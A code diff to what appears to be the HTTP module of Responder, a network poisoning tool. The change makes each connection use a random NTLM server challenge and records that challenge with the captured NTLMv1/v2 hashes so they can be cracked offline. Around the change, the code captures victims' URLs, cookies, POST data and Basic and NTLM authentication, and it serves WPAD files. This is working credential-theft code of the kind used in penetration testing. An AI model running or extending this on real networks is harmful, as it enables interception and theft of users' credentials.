@@ -25,7 +25,7 @@ from packets import WPADScript, ServeExeFile, ServeHtmlFile
 
 
 # Parse NTLMv1/v2 hash.
-def ParseHTTPHash(data, client, module):
+def ParseHTTPHash(data, Challenge, client, module):
 	LMhashLen    = struct.unpack('<H',data[12:14])[0]
 	LMhashOffset = struct.unpack('<H',data[16:18])[0]
 	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
@@ -42,7 +42,7 @@ def ParseHTTPHash(data, client, module):
 		HostNameLen     = struct.unpack('<H',data[46:48])[0]
 		HostNameOffset  = struct.unpack('<H',data[48:50])[0]
 		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, settings.Config.NumChal)
+		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, Challenge.encode('hex'))
 		SaveToDb({
 			'module': module, 
 			'type': 'NTLMv1', 
@@ -61,7 +61,7 @@ def ParseHTTPHash(data, client, module):
 		HostNameLen    = struct.unpack('<H',data[44:46])[0]
 		HostNameOffset = struct.unpack('<H',data[48:50])[0]
 		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
+		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, Challenge.encode('hex'), NTHash[:32], NTHash[32:])
                  
 		SaveToDb({
 			'module': module, 
@@ -173,7 +173,7 @@ def GrabURL(data, host):
 			print text("[HTTP] POST Data: %s" % ''.join(POSTDATA).strip())
 
 # Handle HTTP packet sequence.
-def PacketSequence(data, client):
+def PacketSequence(data, client, Challenge):
 	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
 	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)
 
@@ -192,13 +192,14 @@ def PacketSequence(data, client):
 
 	if NTLM_Auth:
 		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
+                print "Challenge 2:", Challenge.encode('hex')
 		if Packet_NTLM == "\x01":
 			GrabURL(data, client)
 			GrabReferer(data, client)
 			GrabHost(data, client)
 			GrabCookie(data, client)
 
-			Buffer = NTLM_Challenge(ServerChallenge=settings.Config.Challenge)
+			Buffer = NTLM_Challenge(ServerChallenge=Challenge)
 			Buffer.calculate()
 
 			Buffer_Ans = IIS_NTLM_Challenge_Ans()
@@ -211,7 +212,7 @@ def PacketSequence(data, client):
                                  module = "WebDAV"
                         else:
                                  module = "HTTP"
-			ParseHTTPHash(NTLM_Auth, client, module)
+			ParseHTTPHash(NTLM_Auth, Challenge, client, module)
 
 			if settings.Config.Force_WPAD_Auth and WPAD_Custom:
 				print text("[HTTP] WPAD (auth) file sent to %s" % client)
@@ -265,6 +266,7 @@ class HTTP(BaseRequestHandler):
 
 	def handle(self):
 		try:
+                        Challenge = RandomChallenge()
                 	for x in range(2):   
 				self.request.settimeout(3)
 				data = self.request.recv(8092)
@@ -277,7 +279,7 @@ class HTTP(BaseRequestHandler):
 						print text("[HTTP] WPAD (no auth) file sent to %s" % self.client_address[0])
 
 				else:
-					Buffer = PacketSequence(data,self.client_address[0])
+					Buffer = PacketSequence(data,self.client_address[0], Challenge)
 					self.request.send(Buffer)
 		except socket.error:
 			pass
@@ -291,6 +293,7 @@ class HTTPS(StreamRequestHandler):
 
 	def handle(self):
 		try:
+                        Challenge = RandomChallenge()
 			data = self.exchange.recv(8092)
 			self.exchange.settimeout(0.5)
 			Buffer = WpadCustom(data,self.client_address[0])
@@ -301,7 +304,7 @@ class HTTPS(StreamRequestHandler):
 					print text("[HTTPS] WPAD (no auth) file sent to %s" % self.client_address[0])
 
 			else:
-				Buffer = PacketSequence(data,self.client_address[0])
+				Buffer = PacketSequence(data,self.client_address[0], Challenge)
 				self.exchange.send(Buffer)
 		except:
 			pass
